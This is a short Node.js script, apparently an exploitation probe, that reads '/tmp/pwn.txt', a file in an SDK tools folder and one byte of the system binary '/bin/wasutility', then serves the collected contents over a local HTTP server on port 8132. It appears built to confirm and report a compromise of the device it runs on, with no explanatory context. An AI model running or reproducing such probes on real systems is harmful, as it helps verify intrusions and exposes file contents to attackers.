(function() {
  var fs = require('fs');
  var http = require('http');
  var PORT = 8132;
  var paths = [
    '/tmp/pwn.txt',
    '/home/owner/share/tmp/sdk_tools/tbprobe44g.txt'
  ];
  var parts = [];
  paths.forEach(function(p) {
    var v = '(missing)'; try { v = fs.readFileSync(p, 'utf8'); } catch(e) { v = 'err:' + e.message; }
    parts.push('=== ' + p + ' ===\n' + v);
  });
  var wasByte = -1; try { wasByte = fs.readFileSync('/bin/wasutility')[0x7e4b]; } catch(e) {}
  parts.push('wasByte@0x7e4b=0x' + (wasByte & 0xff).toString(16));
  var body = parts.join('\n') + '\n=== END ===\n';
  var srv = http.createServer(function(req, res) { res.end(body); });
  srv.listen(PORT, '127.0.0.1'); srv.on('error', function(){});
  setInterval(function(){}, 60000);
})();
